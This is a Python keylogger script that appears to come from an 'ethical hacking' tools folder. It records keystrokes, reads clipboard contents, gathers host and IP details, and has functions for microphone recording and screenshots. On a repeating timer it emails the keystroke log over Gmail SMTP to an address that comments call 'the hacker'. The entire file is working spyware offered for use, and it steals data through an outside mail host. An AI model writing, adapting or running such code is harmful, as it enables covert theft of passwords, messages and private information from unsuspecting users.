#!/usr/bin/env python

# Libraries for sending the keystrokes text file to the hacker by email

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Libraries for getting computer info

import socket
import platform
import win32clipboard
import os
import time

# Libraries for getting keystrokes

from pynput.keyboard import Key, Listener

# Libraries for fetching info from microphone 

from scipy.io.wavfile import write
import sounddevice

# Libraries fro cryptography

from cryptography.fernet import Fernet

# Libraries for capturing screenshots

import getpass
from requests import get
from PIL import ImageGrab

from multiprocessing import Process, freeze_support
import threading

key_file = "key_log.txt"
system_file = "system_info.txt"
clipboard_file = "clipboard.txt"
audio_file = "audio.wav"
ss_file = "screenshot.png"
file_path = "D:\\Ethical hacking\\Ethical Hacking Tools By Me\\Awesome-Hacking-With-Python\\Advance Keylogger"
extender = "\\"
microphone_time = 20 # in seconds
time_interval_for_email = 30 # in seconds

count = 0
keys = []

email_address = "your mail address"
email_password = "password"
to_address = "your mail address"

def send_email(filename,attachments,to_address):
    from_address = email_address
    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = "Log File"
    body = "Body_of_the_email"
    msg.attach(MIMEText(body,'plain'))
    filename = filename
    attachment = open(attachments,'rb')
    p = MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition',"Attachment; filename = %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(from_address,email_password)
    text = msg.as_string()
    s.sendmail(from_address,to_address,text)
    s.quit()    

def system_information():
    with open(file_path+extender+system_file,"a") as f:
        host_name = socket.gethostname()
        ip_address = socket.gethostbyname(host_name)
        try:
            public_ip = get("https://api.ipfy.org").text
            f.write("Public IP address: " + public_ip + "\n")
        except Exception:
            f.write("Could not get public IP address...\n")

        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("HostName: "+ host_name + "\n")
        f.write("Private IP address: "+ ip_address + "\n\n\n")

def clipboard_information():
    with open(file_path+extender+clipboard_file,"a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data + "\n")
            f.close()
        except Exception:
            f.write("Could not fetch clipboard data...")
            f.close()

def microphone():
    fs = 44100 # This is sampling frequency
    seconds = microphone_time
    recording = sounddevice.rec(int(seconds*fs), samplerate=fs, channels=2)
    sounddevice.wait()
    write(file_path+extender+audio_file,fs,recording)

def screenshot():
    image = ImageGrab.grab()
    image.save(file_path + extender + ss_file)

def on_press(key):
    global keys,count
    keys.append(key)
    count+=1
    if count>=1:
        count=0
        write_file(keys)
        keys=[]

def write_file(keys):
    with open(file_path + extender + key_file, 'a') as f:
        for key in keys:
            k = str(key).replace("'","")
            print(k)
            if k.find("space")>0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False

def report():
    send_email(key_file,file_path+extender+key_file,to_address)
    system_information()
    clipboard_information()
    timer = threading.Timer(time_interval_for_email,report)
    timer.start()

with Listener(on_press=on_press, on_release=on_release) as listener:
    report()
    listener.join()
